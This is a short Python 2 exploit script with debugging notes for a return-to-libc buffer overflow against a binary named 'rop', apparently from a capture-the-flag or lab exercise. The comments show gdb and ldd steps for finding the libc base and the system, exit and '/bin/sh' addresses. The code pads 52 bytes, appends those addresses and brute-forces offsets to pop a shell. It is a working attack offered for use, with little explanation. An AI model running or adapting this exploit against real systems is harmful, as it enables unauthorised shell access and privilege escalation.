# edb --run ./rop $(python -c 'print("A"*52 + "\x04\x03\x02\x01")')
# gdb rop
# r `python /home/ubuntu/Desktop/exp.py`
# p system
# searchmem /bin/sh
# searchmem exit
# ldd rop
# python exp_init_smp.py ./rop 0xb7e05000 0 128
# upload /root/share/rop_fucker.py /tmp/tmp
# server:
# ldd /home/ayush/.binary/rop
#    linux-gate.so.1 =>  (0xb7fda000)
#    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
#    /lib/ld-linux.so.2 (0xb7fdb000)
# libc address = 0xb7e19000
# python rop_fucker.py /home/ayush/.binary/rop 0xb7e19000 0 128

from subprocess import call
import sys
import struct

program_path = sys.argv[1]
libc_address = long(sys.argv[2], 16) or 0xb7e05000
initial_offset = int(sys.argv[3]) or 0
end_offset = int(sys.argv[4]) or 512

total_buffer = 52
libc_addr = struct.pack("<I", libc_address)

while initial_offset < end_offset:
    sys_addr = struct.pack("<I", 0x0003ADA0+libc_address+initial_offset)
    shell_addr = struct.pack("<I", 0x0015BA0B+libc_address+initial_offset)
    exit_addr = struct.pack("<I", 0x0000E3A3+libc_address+initial_offset)

    nops = "A" * total_buffer
    buff = nops + sys_addr + exit_addr + shell_addr
    print("Try: %s" %initial_offset)
    print("buff: " + buff)
    initial_offset += 1
    ret = call([program_path, buff])
